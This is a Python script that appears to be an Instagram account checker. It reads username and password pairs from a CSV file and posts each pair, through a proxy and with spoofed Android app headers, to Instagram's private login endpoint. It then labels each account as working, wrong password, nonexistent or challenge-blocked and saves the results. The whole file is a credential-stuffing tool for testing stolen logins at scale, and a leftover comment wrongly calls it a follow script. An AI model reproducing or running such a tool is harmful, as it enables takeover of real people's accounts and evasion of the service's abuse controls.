import requests
import csv 

data = input("Path to the CSV File? ")

proxies = {
    "http": "http://YOUR Proxy",
    "https": "http://Your Proxy",
}

with open(data, ) as csv_file:

            csv_reader = csv.reader(csv_file)

            #Instagram Follow User
            for line in csv_reader:
                passw = line[0]
                user = line[1]
                headers = {
                    'x-ig-app-locale': 'en_US',
                    'x-ig-device-locale': 'en_US',
                    'x-ig-mapped-locale': 'en_US',
                    'x-pigeon-session-id': 'UFS-f5df0ab4-bfb3-4611-bc7a-0e2bce8aa571-1',
                    'x-pigeon-rawclienttime': '1666856035.242',
                    'x-ig-bandwidth-speed-kbps': '-1.000',
                    'x-ig-bandwidth-totalbytes-b': '0',
                    'x-ig-bandwidth-totaltime-ms': '0',
                    'x-bloks-version-id': 'ce555e5500576acd8e84a66018f54a05720f2dce29f0bb5a1f97f0c10d6fac48',
                    'x-ig-www-claim': '0',
                    'x-bloks-is-layout-rtl': 'false',
                    'x-ig-device-id': '1c0a5527-2663-4a63-9cd1-bbae283f7bb4',
                    'x-ig-family-device-id': '17a902db-b08c-4174-9b91-996133f2fdb9',
                    'x-ig-android-id': 'android-bafd5882366dad00',
                    'x-ig-timezone-offset': '19800',
                    'x-ig-nav-chain': 'FacebookLandingFragment:landing_facebook:1:warm_start::,LoginLandingFragment:login_landing:2:button::',
                    'x-fb-connection-type': 'WIFI',
                    'x-ig-connection-type': 'WIFI',
                    'x-ig-capabilities': '3brTv10=',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': 'Instagram 258.1.0.26.100 Android (30/11; 440dpi; 1080x2028; Xiaomi; Redmi Note 5 Pro; whyred; qcom; en_US; 412452755)',
                    'accept-language': 'en-US',
                    'x-mid': 'Y1o0WwABAAETHUQupC8u7_bOF05S',
                    'ig-intended-user-id': '0',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                }

                data = {
                    'signed_body': 'SIGNATURE.{"jazoest":"22332","country_codes":"[{\\"country_code\\":\\"1\\",\\"source\\":[\\"default\\"]}]","phone_id":"17a902db-b08c-4174-9b91-996133f2fdb9","enc_password":"#PWD_INSTAGRAM:0:1666856035:'+passw+'","username":"'+user+'","adid":"8fdae5cf-0bf7-4537-8216-02a22ca280c9","guid":"1c0a5527-2663-4a63-9cd1-bbae283f7bb4","device_id":"android-bafd5882366dad00","google_tokens":"[]","login_attempt_count":"0"}',
                }



                response = requests.post('https://i.instagram.com/api/v1/accounts/login/', proxies=proxies, headers=headers, data=data)

                result = ""

                if response.status_code != 200:

                    response_json = response.json()

                    if 'message' in response_json and response_json['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
                        result = "The username you entered doesn't appear to belong to an account. Please check your username and try again."

                    elif 'message' in response_json and response_json['message'] == "challenge_required":
                        result = "Ask for 6 digit code or is banned."

                    elif 'invalid_credentials' in response_json and response_json['invalid_credentials'] == True:
                        result = "The password you entered is incorrect. Please try again."

                    else:
                        result = "Error: " + response.text

                else:
                    response_json = response.json()

                    if 'logged_in_user' in response_json:
                        result = "Account is Working."

                    else:
                        result = "Account is not working."

                header = ['E-Mail Adress / Phonenumber', 'Password', 'Result' ]
                data = [user, passw, result]

                with open('InstagramResult.csv', 'a', encoding='UTF8') as f:
                    writer = csv.writer(f)

                    if f.tell() == 0:
                        writer.writerow(header)
                    writer.writerow(data)
